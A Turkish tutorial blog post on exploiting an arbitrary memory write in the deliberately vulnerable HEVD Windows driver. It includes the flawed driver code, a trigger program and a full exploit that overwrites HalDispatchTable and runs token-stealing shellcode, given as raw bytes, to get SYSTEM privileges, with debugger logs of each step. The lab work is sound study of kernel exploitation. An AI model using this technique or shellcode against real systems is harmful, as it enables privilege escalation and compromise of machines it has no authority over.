---
title: WÇÇ - Hafızaya Yetkisiz Yazım
tags: [Bilgisayar, Windows, Çekirdek Modu]
---

Sayın çekirdek severler, yazı dizimizin üçüncü yazısından herkese selamlar. Bu yazıda sağı solu zafiyet dolu olan **HEVD** sürücümüzdeki bir başka zafiyet türünü inceleyeceğiz. Bu yazının konusu ise kullanıcı modundan, çekirdek modundaki bir alana yetkisiz bir şekilde yazma yapmamızı sağlayan, tarzancada "Arbitary Memory Write" yahu "*Write, What, Where*" olarak bilinen ve dilimize Hafızaya Yetkisiz Yazım yahut Yazar; Nereye, Ne Yazar (YNNY) olarak -hehe- çevirebileceğimiz bir zafiyet türü.

## Zafiyetin Analizi

Öncelik bu zafiyet nedir? Nasıl çalışır kısaca ona bir değinelim. İsminden da anlaşılabileceği gibi bu tür zafiyetler bize çekirdek modunda normalde erişmeye iznimiz olmayan bir yere veri yazmamıza izin veriyor. Bu zafiyetin çok çeşitli türleri var. Mesela öyle durumlarla karşılaşıyorsunuz ki yalnızca 1 baytlık bir alana veri yazabiliyorsunuz. Ama bu 1 baytı sakın ola küçümsemeyin lakin örnek vermek gerekirse bir süre önce Windows çekirdeğindeki sayısal imza kontrolünü aşmak için çekirdekteki bir baytlık bir alana yazabilmek yeterliydi. Şu anda bile bir bayt yazma yaparak yapabilecekleriniz hiç de küçümsenecek cinsten değil... Bu tür bir durumu keşfettikten sonra geriye yalnızca "*exploit*"i yazacağınız ortam ile ilgili bilginizi kullanarak işe yarar bir şey ortaya çıkarmak kalıyor. Zaten bu işlerin esas eğlenceli kısmı bir tanesiyle değil, birden fazla zafiyetin birleşmesiyle yazılan "exploit"'lerde ortaya çıkıyor. Fakat bu işlerin eğlencesinin birkaç senesi kaldı sadece, onu da söyleyelim. O nedenle hayatımızın sonuna geldiğimizde tek bildiğimiz şey bunlar olmazsa bizler için daha iyi olur diye değerlendiriyorum. Neyse, işin bu tarafını bir kenara bırakalım şimdilik, o tarafla ilgili de yazılar yazmayı düşünüyorum yakın zamanda inşallah.

Pekala, o zaman ufaktan girişelim. Önceki yazılarda yaptığımız gibi öncelikle zafiyet içeren kısmın analizini yapalım. Bu zafiyeti tetikleyen fonksiyona ulaşmamızı sağlayan IOCTL `0x22200B`. Kaynak koda baktığımızda bu `HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE` tanımına denk geliyor. Burada bizi ilk karşılayan fonksiyon şu şekilde:

```
; NTSTATUS __fastcall ArbitraryOverwriteIoctlHandler(PIRP Irp, PIO_STACK_LOCATION IrpSp)
ArbitraryOverwriteIoctlHandler proc near
                sub     rsp, 28h
                mov     rcx, [rdx+20h]  ; Gelen veri
                mov     eax, STATUS_UNSUCCESSFUL
                test    rcx, rcx
                jz      short FAILED
                call    TriggerArbitraryOverwrite
FAILED:
                add     rsp, 28h
                retn
ArbitraryOverwriteIoctlHandler endp
```

Burada kayda değer bir şey yok. Kullanıcı modundan gönderilen veri `TriggerArbitraryOverwrite` isimli başka bir fonksiyona gönderiliyor, o kadar. Esas mesele belli ki bu fonksiyonda. O zaman ona da bir bakalım:

```
                ...
                ...
                xor     esi, esi        ; esi = 0
                lea     edx, [rsi+10h]  ; Boyut
                lea     r8d, [rsi+8]    ; Hizalama
                call    ProbeForRead
                mov     rbx, [r12]      ; r12 = Kullanıcıdan gelen veri, rbx = Verinin ilk 8 baytlık kısmının adresi
                mov     rdi, [r12+8]    ; rdi = Gelen verinin ikinci 8 baytlık kısmının adresi
                mov     r11d, [rbx]     ; İlk kısımdaki verinin 4 baytlık kısmını r11d'ye koy
                mov     [rdi], r11d     ; Bu veriyi rdi'de tutulan adrese yaz!!!! İşte zafiyetin kilit noktası!!!
loc_15C05:                             
                mov     eax, esi        ; Geri dönüş değeri = 0 -> STATUS_SUCCESFULL
                ...
                ...
```

Görüldüğü üzere fonksiyonumuzun bizi ilgilendiren kısmı oldukça küçük ve basit. Bize kullanıcı modundan bir veri geliyor. `ProbeForRead` fonksiyonuna gelen argümanlara bakılırsa bu verinin toplam boyutu 16 bayt gibi gözüküyor. Hemen devamında zaten bu veriye erişen iki minik komut görüyoruz. Buradan anlıyoruz ki bu veri yapısında iki adet 8 baytlık değer var. Bunların birinin adresi `rbx` yazmacına, diğeri ise `rdi` yazmacına alınıyor. Devamında `rbx` yazmacındaki adreste bulunan veri okunup `r11d` yazmacına alınıyor akabinde ise bu veri `rdi` yazmacında bulunan adrese yazılıyor. İşte bu durumda oluşan zafiyete de biz YNNY - yahut "Write, What, Where" zafiyeti diyoruz. Bu arada şuna dikkat etmekte fayda var, `rbx` yazmacındaki adreste bulunan verinin **4 baytlık** kısmını kullanıyoruz, bu önemli. Yani biz mesela bir yere bir fonksiyon göstericisi yazmak istersek bu zafiyeti iki kere kullanmamız gerekecek çünkü işletim sistemimiz 64 bit, fakat tabi ki hiç sorun değil. 

Burada elimizde şöyle bir imkan var, görüldüğü gibi kodu yazan arkadaş hiçbir doğrulama yapmamış. O zaman bu ne demektir? Biz nereye ne yazacağımızı kendimiz belirleyebiliriz! O halde esas önemli soru "neyi, nereye yazacağız?" sorusudur. Bunun elbette tek bir cevabı yok. Esasen tamamen hayal gücünüze kalmış da diyebiliriz. Mesela dünya çapında yapılan yarışmalarda bu yazı dizisinde bahsettiğimiz atıyorum 5 zafiyet türünü de kullanan "exploit"'ler yazılıyor. Hepsi büyük resmin bir parçasını oluşturan minik resimler olarak kullanılıyor. Dolayısıyla bu tür bir zafiyet bulduğunuzda ne yapacağınız çoğunlukla o an ne tür bir durumda olduğunuz ve ne yapmak istediğinize göre değişiyor. Biz bu yazı dizisinde yetkilerimizi yükseltmek istediğimiz için yine onu yapacağız. Fakat bu yazının biraz daha ilerisinde olacak inşallah. 

Zafiyetin analizi ile ilgili son olarak yine netleşmesi için **C** kodunun kendisini de görelim.

```c
NTSTATUS TriggerArbitraryOverwrite(IN PWRITE_WHAT_WHERE UserWriteWhatWhere) {
    PULONG_PTR What = NULL;
    PULONG_PTR Where = NULL;
    NTSTATUS Status = STATUS_SUCCESS;

    PAGED_CODE();

    __try {
		//
        // Bize gelen veriyi kontrol et, okunuyor mu ve
        // kullanıcı modunda mı?
        //
        ProbeForRead((PVOID)UserWriteWhatWhere,
                     sizeof(WRITE_WHAT_WHERE),
                     (ULONG)__alignof(WRITE_WHAT_WHERE));

        What = UserWriteWhatWhere->What;
        Where = UserWriteWhatWhere->Where;

#ifdef SECURE
        //
        // Güvenli: Eğer kod bu şekilde olsaydı, bu zafiyet oluşmayacaktı. Çünkü
        // kodu yazan arkadaşımız kullanıcı modundan aldığı veriye güvenmeyip önce kontrol
        // ediyor. Burada ProbeForRead sınadığı adreslerin kullanıcı modunda olmaması durumunda
        // bir istisna fırlatıp zafiyetin oluşmasını engellemiş olacak.
        // 
        ProbeForRead((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(PULONG_PTR));
        ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(PULONG_PTR));

        *(Where) = *(What);
#else
        //
        // Güvensiz: İşte tipik bir YNNY zafiyeti. Bunun sebebi nedir? Çok basit
        // kodu yazan arkadaşımız kullanıcı modundan gelen veriye tamamiyle güvenmiş,
        // acaba bu kullanıcı moduna mı yazıyor, çekirdek moduna mı yazıyor diye kontrol
        // etmemiş. E tabi sonucu da ağır olacak...
        //
        *(Where) = *(What);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
    }

    return Status;
}
```

## Zafiyetin Tetiklenmesi

Yukarıda öğrendiklerimizle önceki yazdığımız kodları birleştirirsek basitçe şu şekilde zafiyeti tetikleyebiliriz. Burada ben "*nereye*" ve "*ne*" kısımlarına işe yaramaz bir veri veriyorum. Beklediğim şey ise, çalıştığında `TriggerArbitraryOverwrite` fonksiyonu içerisinde bir istisna fırlaması. Çünkü verdiğim değerlerin geçerli bir adres olmadığını biliyorum. O nedenle koddaki istisna işleyici tarafından yakalanması gerekiyor bu durumun. 

Kodumuz şu şekilde:

```c
#include "stdafx.h"
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE (FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

int main()
{
	BOOL Result             = FALSE;
	DWORD Retval            = 0;
	ULONGLONG Veri[2];
	HANDLE hDeviceHandle    = INVALID_HANDLE_VALUE;
	const WCHAR* DeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";

	printf("*** Cekirdegi Kitliyoruz - YNNY ***\n");

	//
	// Surucuye tutamak al
	//
	hDeviceHandle = CreateFile(
		DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if(hDeviceHandle == INVALID_HANDLE_VALUE)
	{
		printf("Surucuye tutamak alamiyoruz?!\n");
		goto RETURN;
	}

	printf("Hop, tutamak geldi : %p\n", hDeviceHandle);

	//
	// Sahte verimizi ayarla
	// NOT: Hedef sistem 64 bit, uygulama ise 32 bit
	//
	Veri[0] = 0x4242424242424242;
	Veri[1] = 0x4343434343434343;

	//
	// Hadi (b)akalım :P
	//
	Result = DeviceIoControl(
		hDeviceHandle,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		&Veri,
		sizeof(Veri),
		NULL,
		0,
		&Retval,
		NULL);

    printf("Evet, emaneti yolladik! Sonuc : %d\n", Result);

RETURN:

	if(hDeviceHandle)
	{
		CloseHandle(hDeviceHandle);
	}

    return 0;
}
```

Doğrulamak için hata ayıklayıcıda `HEVD!TriggerArbitraryOverwrite+0x27` adresine bir durma noktası koyuyorum. Devamında uygulamayı çalıştırıyorum. Durma noktasına çarptığında `r12` yazmacında gönderdiğim veri olacak. Bakalım beklediğimiz şey geldi mi?

```
kd> g
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
Breakpoint 0 hit
HEVD!TriggerArbitraryOverwrite+0x27:
fffff880`03398b9b 498b1c24        mov     rbx,qword ptr [r12]
kd> r
rax=000007ffffff0000 rbx=fffffa8303b25ee0 rcx=00000000002cfd40
rdx=00000000002cfd50 rsi=0000000000000000 rdi=fffffa8303b25fb0
rip=fffff88003398b9b rsp=fffff88004166780 rbp=fffffa8303798f20
 r8=0000000000000007  r9=0000000000000003 r10=0000000000000000
r11=fffff88004166400 r12=00000000002cfd40 r13=0000000000000000
r14=0000000000000010 r15=fffffa8303b25f01
iopl=0         nv up ei ng nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
HEVD!TriggerArbitraryOverwrite+0x27:
fffff880`03398b9b 498b1c24        mov     rbx,qword ptr [r12] ds:002b:00000000`002cfd40=4242424242424242
kd> dq r12
00000000`002cfd40  42424242`42424242 43434343`43434343
00000000`002cfd50  01882514`8b486550 8b4d705a`8b4c0000
00000000`002cfd60  0a8b4900`00018893 04fa8348`f8518b48
```

Gördüldüğü üzere `dq` ile 8 baytlık parçalar halinde `r12` yazmacındaki adrese baktığımda gönderdiğim veriyi görüyorum. Çalışmayı devam ettirelim.

```
kd> g
[+] UserWriteWhatWhere: 0x00000000002CFD40
[+] WRITE_WHAT_WHERE Size: 0x10
[+] UserWriteWhatWhere->What: 0x4242424242424242
[+] UserWriteWhatWhere->Where: 0x4343434343434343
[+] Triggering Arbitrary Overwrite
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
```

Beklediğimiz gibi bir istisna fırladı ve yakalandı. İstisna kodu gördüğünüz gibi `0xC0000005`, o da `STATUS_ACCESS_VIOLATION` demek oluyor. Tam olarak beklediğimiz sonuç.

## "*Exploit*" Yazımı

Şimdi geldik cavcaklı bölüme. Küçük bir hafıza tazeleme yaparsak bizim önceki yazılarımızda yaptığımız şey "*token*" çalan bir "*shellcode*"'u çalıştırmaktı. Pekii, bu zafiyet türünü kullanarak bu "*shellcode*"'umuzu nasıl çağıracağız? Burada çağırmaya izin veren bir şey yok ki! Sadece bir yerlere bir şeyler yazmamıza izin veriyor. Amacımız bir yerlere yazıp birtakım korumaları devre dışı bırakmak olmadığına göre, çağırılacağını bildiğimiz bir yerin adresinin üzerine bizim [çakal karlos](https://www.youtube.com/watch?v=8jUqmKkDzEA)'un adresini yazarsak nasıl olur???

### Nereye Yazalım?

O halde çağırılacağını bildiğimiz bir yerin değerini değiştirelim. Mesela [SSDT](/posts/kancalama-sanati-ssdt) tablosundaki bir fonksiyon göstericinin üzerine yazsak nasıl olur? Teorik olarak olur, ama pratikte sorun çıkarır. Neden? Birincisi bu tablo PatchGuard[^1] kankamız tarafından korunuyor. - Gerçi biraz sonra göstereceğimiz yer de korunuyor da, neyse, bizim işimizi görmek için yeterli zamanımız olacak hehe- Burada yaptığımız bir değişiklik onu sinirlendirecektir. İkincisi ve esas önemlisi, işletim sisteminin iç işleyişini mümkün oldukça bozmamamız gerekiyor. Saniyede binlerce çağrı oluyor bu sistemde, bizim yapacağımız bu değişiklik ortalığı ciddi anlamda karıştırabilir. 

Hmm. O halde bu demektir ki bize tenha bir yer lazım. Çok fazla çağırılmayan, çağırılsa da sağı solu patlatmayan bir şey. O zaman neden `HalDispatchTable`'ı denemeyelim? Hem yazılabilir hem de nadir kullanılan bir alan neticede??? 2007'de bir vatandaşın aklına gelmiş bu yöntem. Bir sunumda bahsetmişti fakat şu an adını getiremedim. Peki olay nedir? Çok basit. Windows'daki donanım soyutlama katmanının (HAL) işini yaparken kullandığı SSDT gibi bir tablo burası. Fakat SSDT'ye göre çok daha nadir kullanılıyor. Biz bu tablonun ikinci sırasındaki fonksiyon göstericisini, bizim "*shellcode*"'umuzun adresi ile değiştirirsek iş tamamdır. Ha, "yahu bunu buraya koyduk da, nasıl çağırılacak bu???"" diyenleri duyar gibiyim, onun için de başka bir fonksiyon devreye girecek : `NtQueryIntervalProfile`.

Öncelikle bu tablonun değiştireceğimiz kısmında ne var onu göstereyim:

```
kd> dq nt!HalDispatchTable
fffff800`02810cb0  00000000`00000004 fffff800`02c438e8
fffff800`02810cc0  fffff800`02c44470 fffff800`02a0f5e0
fffff800`02810cd0  00000000`00000000 fffff800`026db170
fffff800`02810ce0  fffff800`029b4b50 fffff800`029b528c
fffff800`02810cf0  fffff800`02afdf60 fffff800`026befe0
fffff800`02810d00  fffff800`02683490 fffff800`02683490
fffff800`02810d10  fffff800`02c42ca4 fffff800`02c43e88
fffff800`02810d20  fffff800`02c18534 fffff800`02c42c18
kd> u fffff800`02c438e8
hal!HaliQuerySystemInformation:
fffff800`02c438e8 fff3            push    rbx
fffff800`02c438ea 55              push    rbp
fffff800`02c438eb 56              push    rsi
fffff800`02c438ec 57              push    rdi
fffff800`02c438ed 4154            push    r12
fffff800`02c438ef 4881ec40010000  sub     rsp,140h
fffff800`02c438f6 488b0503b8feff  mov     rax,qword ptr [hal!_security_cookie (fffff800`02c2f100)]
fffff800`02c438fd 4833c4          xor     rax,rsp
kd> !pte nt!HalDispatchTable
                                           VA fffff80002810cb0
PXE at FFFFF6FB7DBEDF80    PPE at FFFFF6FB7DBF0000    PDE at FFFFF6FB7E0000A0    PTE at FFFFF6FC00014080
contains 0000000000199063  contains 0000000000198063  contains 00000000028009E3  contains 0000000000000000
pfn 199       ---DA--KWEV  pfn 198       ---DA--KWEV  pfn 2800      -GLDA--KWEV  LARGE PAGE pfn 2810        
```

Görüldüğü üzre `HaliQuerySystemInformation` fonksiyonu var. Biz bu fonksiyonun yerine kendi "*token*" çalan kod parçacığımızı koyacağız. Bu kod parçacığının çağırılmasını da resmi olarak belgelere geçmemiş olan `NtQueryIntervalProfile` fonksiyonu yapacak. Fonksiyonun öntanımı şu şekilde :

```c
NTSTATUS 
NtQueryIntervalProfile (
    KPROFILE_SOURCE ProfileSource, 
    ULONG *Interval
    );
```

Bu fonksiyonu incelediğimizde ise şöyle makine kodlarıyla karşılaşıyoruz:

```
kd> u nt!NtQueryIntervalProfile+0x22
nt!NtQueryIntervalProfile+0x22:
fffff800`02a1c7a2 488b055728ebff  mov     rax,qword ptr [nt!MmUserProbeAddress (fffff800`028cf000)]
fffff800`02a1c7a9 483bd0          cmp     rdx,rax
fffff800`02a1c7ac 480f43d0        cmovae  rdx,rax
fffff800`02a1c7b0 8b02            mov     eax,dword ptr [rdx]
fffff800`02a1c7b2 8902            mov     dword ptr [rdx],eax
fffff800`02a1c7b4 eb02            jmp     nt!NtQueryIntervalProfile+0x38 (fffff800`02a1c7b8)
fffff800`02a1c7b6 eb14            jmp     nt!NtQueryIntervalProfile+0x4c (fffff800`02a1c7cc)
fffff800`02a1c7b8 e8830affff      call    nt!KeQueryIntervalProfile (fffff800`02a0d240) <----------- Dikkat
kd> u nt!KeQueryIntervalProfile+0x1b
nt!KeQueryIntervalProfile+0x1b:
fffff800`02a0d25b eb2f            jmp     nt!KeQueryIntervalProfile+0x4c (fffff800`02a0d28c)
fffff800`02a0d25d ba0c000000      mov     edx,0Ch
fffff800`02a0d262 894c2420        mov     dword ptr [rsp+20h],ecx
fffff800`02a0d266 4c8d4c2440      lea     r9,[rsp+40h]
fffff800`02a0d26b 8d4af5          lea     ecx,[rdx-0Bh]
fffff800`02a0d26e 4c8d442420      lea     r8,[rsp+20h]
fffff800`02a0d273 ff153f3ae0ff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff800`02810cb8)]  <----------- Dikkat
fffff800`02a0d279 85c0            test    eax,eax

```

Görüldüğü üzere bu fonksiyon `HalDispatchTable + 0x8` adresindeki fonksiyonu çağırıyor. Tamamdır o zaman, her şey hazır geriye sadece "exploit"'i yazmak kaldı. O halde kaba taslak yapmamız gerekenleri belirleyelim:

1. `HalDispatchTable`'ın adresini bul
2. "Shellcode"'umuzu hazırla ve adresini al
3. İki kere zafiyetli fonksiyonu çağırarak bu adresi `HalDispatchTable`'a yerleştir.
4. `NtQueryIntervalProfile` fonksiyonunu çağırarak fonksiyon çağırımını tetikle

#### HalDispatchTable Adresinin Bulunması

Yapılacaklar listemizdeki tek muamma `HalDispatchTable`'ın adresi. Malumunuz işletim sistemlerindeki **ASLR** koruması nedeniyle modüllerin hafıya yüklenmesi sırasında taban adresleri değiştirilmekte. Bu nedenle bu `HalDispatchTable` her zaman sabit bir adreste durmuyor, bunun adresini bulmamız gerekiyor. Zor bir şey mi? Hiç değil. Tek yapmamız gereken şey çekirdeğin taban adresini bulmak, ardından kullanıcı modunda bir çekirdeği daha hafızaya eşleyip bunun aracılığıyla `HalDispatchTable`'ın taban adrese olan uzaklığını bulmak. Bunu yapınca `HalDispatchTable`'ın adresini de bulmuş olacağız.

O halde ilk gereken şey çekirdeğin taban adresi. Bunu almak için `NtQuerySystemInformation` fonksiyonunu `SystemModuleInformation` parametresi ile çağırabilirsiniz. Bunu yaptığınızda bu fonksiyon size sistemde bulunan modüller ile ilgili bilgiler dönecek. Yanılmıyorsam ilk sırada çekirdeğin bilgileri var. Buradan taban adresinı alıyoruz, cepte.

Devamında `LoadLibrary` ile NT çekirdeğini hafızaya yükleyip, bu fonksiyonun döndüğü tutamak ile çekirdek modulünde `HalDispatchTable` adresini `GetProcAddress` ile alıyoruz. Etti mi cepte 2. Sonrasında `LoadLibrary` ile yüklediğiniz çekirdeğin taban adresini `GetProcAddress`'in döndüğü değerden çıkarırsanız, `HalDispatchTable`'ın taban adresine olan uzaklığını bulmuş olursunuz. Devamında ise ilk başta cebe attığımız esas çekirdeğin taban adresine bunu eklediğinizde sisteminizdeki çalışır durumda olan `HalDispatchTable`'ın adresini bulmuş olacaksınız. Aşağıdaki "exploit"'te bu kısmı yapan kodu vermeyeceğim, sizlere bir alıştırma olarak bırakıyorum. Bu alıştırmayı yapmak isteyenlerden ricam lütfen internetten hazır kodlara bakmadan, sadece fonksiyon öntanımları ile hareket ederek yapsınlar, kendileri için de çok güzel olur...

### Büyük Patlama Aşaması

Evet artık sona geldik, yukarıda dediğim gibi çalışma zamanında `HalDispatchTable`'ın adresini bulmayı size bıraktığım için burada ben hata ayıklayıcıdan `HalDispatchTable`'ın adresini alarak devam edeceğim.

```
kd> dq nt!HalDispatchTable
fffff800`02847cb0  00000000`00000004 fffff800`026458e8
fffff800`02847cc0  fffff800`02646470 fffff800`02a465e0

```

Gördüğünüz üzre başlangıç adresi `0xfffff80002847cb0` olarak görünüyor. Ne demiştik? İkinci sıradaki fonksiyon göstericiyi değiştireceğiz. 64 bit sistem olduğunu da düşünürsek hedefimiz `0xfffff80002847cb0 + 8`.

Geriye sadece "shellcode"'umuzun adresini buraya yazmak kalıyor. Bunu da yukarıda değindiğimiz sebepten ötürü iki adımda yapacağız. Kodumuzun son hali şu şekilde:

```c
#include "stdafx.h"
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE (FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(
	IN ULONG ProfileSource,
	OUT PULONG Interval
	);

int main()
{
	BOOL Result = FALSE;
	DWORD Retval = 0;
	HANDLE hDeviceHandle = INVALID_HANDLE_VALUE;
	const WCHAR* DeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";

	ULONG Interval = 0;
	ULONGLONG Veri[2], Ne;
	NtQueryIntervalProfile_t a_NtQueryIntervalProfile = NULL;

	printf("*** Cekirdegi Kitliyoruz - YNNY ***\n");

	//
	// "Token" calan parcacik
	//
	unsigned char cakal[57] = {
		0x50, 0x65, 0x48, 0x8B, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4C, 0x8B,
		0x5A, 0x70, 0x4D, 0x8B, 0x93, 0x88, 0x01, 0x00, 0x00, 0x49, 0x8B, 0x0A,
		0x48, 0x8B, 0x51, 0xF8, 0x48, 0x83, 0xFA, 0x04, 0x74, 0x05, 0x48, 0x8B,
		0x09, 0xEB, 0xF1, 0x48, 0x8B, 0x81, 0x80, 0x00, 0x00, 0x00, 0x24, 0xF0,
		0x49, 0x89, 0x83, 0x08, 0x02, 0x00, 0x00, 0x58, 0xC3
	};

	//
	// Adresini sakla lazım olacak
	//
	Ne = (ULONGLONG)&cakal;

	//
	// Parcacigin alanini calistirilabilir yap
	//
	DWORD oldProtect;
	VirtualProtect(cakal, sizeof(cakal), PAGE_EXECUTE_READWRITE, &oldProtect);

	//
	// Surucuye tutamak al
	//
	hDeviceHandle = CreateFile(
		DeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hDeviceHandle == INVALID_HANDLE_VALUE)
	{
		printf("Surucuye tutamak alamiyoruz?!\n");
		goto RETURN;
	}

	printf("Hop, tutamak geldi : %p\n", hDeviceHandle);

	//
	// Adresin alt kısmını yaz
	//
	Veri[0] = (ULONGLONG)&Ne;
	Veri[1] = 0xfffff80002847cb0 + 8;

	//
	// Hadi (b)akalım :P
	//
	Result = DeviceIoControl(
		hDeviceHandle,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		&Veri,
		sizeof(Veri),
		NULL,
		0,
		&Retval,
		NULL);

	//
	// Adresin üst kısmını yaz
	//
	Veri[0] = (ULONGLONG)((PCHAR)&Ne + 4);
	Veri[1] = 0xfffff80002847cb0 + 8 + 4;

	//
	// Hadi (b)akalım :P
	//
	Result = DeviceIoControl(
		hDeviceHandle,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		&Veri,
		sizeof(Veri),
		NULL,
		0,
		&Retval,
		NULL);

	printf("Evet, emaneti yolladik! Sonuc : %d\n", Result);

	//
	// Çağrıyı tetikle
	//
	a_NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryIntervalProfile");
	if (a_NtQueryIntervalProfile == NULL)
	{
		printf("Adresi alamiyoruz?!\n");
		goto RETURN;
	}

	//
	// TİK TAK TİK TAK
	//
	a_NtQueryIntervalProfile(0xBeBe, &Interval);
	system("cmd");

RETURN:

	if (hDeviceHandle)
	{
		CloseHandle(hDeviceHandle);
	}

	return 0;
}
```

Sanıyorum oldukça anlaşılır. IOCTL'i iki defa gönderiyoruz. Birinde kodumuzun alt kısmının adresini, diğerinde ise üst kısmının adresini hedefimize yazdırıyoruz. Eğer bu alıştırmayı 32 bit işletim sisteminde yapacaksanız buna gerek olmadığına dikkat edin. Orada zaten gösterici boyutları 32 bit olduğu için tek seferde bu yazma işlemini gerçekleştirebilirsiniz.

Son olarak yazdığımız kodu test edip, yetki yükseltme yapıp yapmadığımızı kontrol edelim. Ha, bu arada "shellcode"'umuz önceki yazının aynısı. Burada da kodun olağan işleyişini bozmadığımız için düz bir şekilde `ret` komutunu çalıştırmak yeterli.

Öncelikle sıra sıra işleyişi hata ayıklayıcıdan takip edelim:

```
kd> bp nt!KeQueryIntervalProfile+0x33
kd> bp HEVD!TriggerArbitraryOverwrite+0x7b
kd> g
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
[+] UserWriteWhatWhere: 0x00000000002CF938
[+] WRITE_WHAT_WHERE Size: 0x10
[+] UserWriteWhatWhere->What: 0x00000000002CF928
[+] UserWriteWhatWhere->Where: 0xFFFFF80002847CB8
[+] Triggering Arbitrary Overwrite
kd> dq r12 l2
00000000`002cf938  00000000`002cf928 fffff800`02847cb8
kd> u poi(00000000`002cf928) l5
00000000`002cf948 50              push    rax
00000000`002cf949 65488b142588010000 mov   rdx,qword ptr gs:[188h]
00000000`002cf952 4c8b5a70        mov     r11,qword ptr [rdx+70h]
00000000`002cf956 4d8b9388010000  mov     r10,qword ptr [r11+188h]
00000000`002cf95d 498b0a          mov     rcx,qword ptr [r10]
kd> r rdi, r11d
rdi=fffff80002847cb8 r11d=2cf948
```

"Shellcode"'umuz `0x00000000002cf948` adresinde, bu adresi `0xfffff80002847cb8` adresine yazacağız. `r11d` yazmacında yazılacak olan, `rdi` yazmacında ise nereye yazılacağı yazıyor. Görüldüğü üzere biri `HalDispatchTable + 8` iken, diğeri "shellcode"'umuzun adresinin alt kısmı.

İkinci yarısıyla devam edelim:

```
kd> g
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
[+] UserWriteWhatWhere: 0x00000000002CF938
[+] WRITE_WHAT_WHERE Size: 0x10
[+] UserWriteWhatWhere->What: 0x00000000002CF92C
[+] UserWriteWhatWhere->Where: 0xFFFFF80002847CBC
[+] Triggering Arbitrary Overwrite
kd> dq r12 l2
00000000`002cf938  00000000`002cf92c fffff800`02847cbc
kd> dd rbx l2
00000000`002cf92c  00000000 <---- Bu sıfırlı kısım alınıp, rdi'deki adrese yazılacak
kd> dd rbx-4 l1
00000000`002cf928  002cf948 <---- Bir önceki gönderdiğimizde böyleydi
kd> r rdi
rdi=fffff80002847cbc
kd> r r11d
r11d=0
```

Dikkat ederseniz burada iki adres de kodda istediğimiz biçimde 4 artımış durumda. Bu defa nereye sorusunun cevabı `0xfffff80002847cbc`, ne sorusunun cevabı ise `0`. Kodumuzu devam ettirdiğimizde `HalDispatchTable`'ı kontrol edersek "shellcode"'umuzun geldiğini görebiliriz:

```
kd> dq nt!HalDispatchTable
fffff800`02847cb0  00000000`00000004 00000000`002cf948 <---- Buradayız
fffff800`02847cc0  fffff800`02646470 fffff800`02a465e0
fffff800`02847cd0  00000000`00000000 fffff800`02712170
kd> u poi(nt!HalDispatchTable+0x8) l8
00000000`002cf948 50              push    rax
00000000`002cf949 65488b142588010000 mov   rdx,qword ptr gs:[188h]
00000000`002cf952 4c8b5a70        mov     r11,qword ptr [rdx+70h]
00000000`002cf956 4d8b9388010000  mov     r10,qword ptr [r11+188h]
00000000`002cf95d 498b0a          mov     rcx,qword ptr [r10]
00000000`002cf960 488b51f8        mov     rdx,qword ptr [rcx-8]
00000000`002cf964 4883fa04        cmp     rdx,4
00000000`002cf968 7405            je      00000000`002cf96f
```

Her şey tamam gözüküyor! Hata ayıklayıcıyı devam ettirip, yetki yükseltme olup olmadığını kontrol edelim:

![](/files/arbit_sonuc.jpg)

Görüldüğü üzere bir kez daha sistem yetkilerine ulaşmış olduk...

Peki bunları niye anlatıyoruz? Ne işe yarayacak? Aslında tamamen sizin seçiminize kalmış. Bu blogda yazılan her şey hem iyi niyetle hem de kötü niyetle kullanılabilir. Benim bunları yazma amacım başta kendim için önden bir şeyler gönderebilmek, sonrasında ise kendi dilimizde aradığımızda ulaşılabilecek bilgi kaynağı kazandırmak. Umuyorum ki buradan edindiğiniz bilgileri iyiye dair olan fikirlerinizle birlikte kullanırsınız.

Selametle.

[^1]: Sistemdeki önemli veri yapılarını korumakla görevli bir mekanizma.
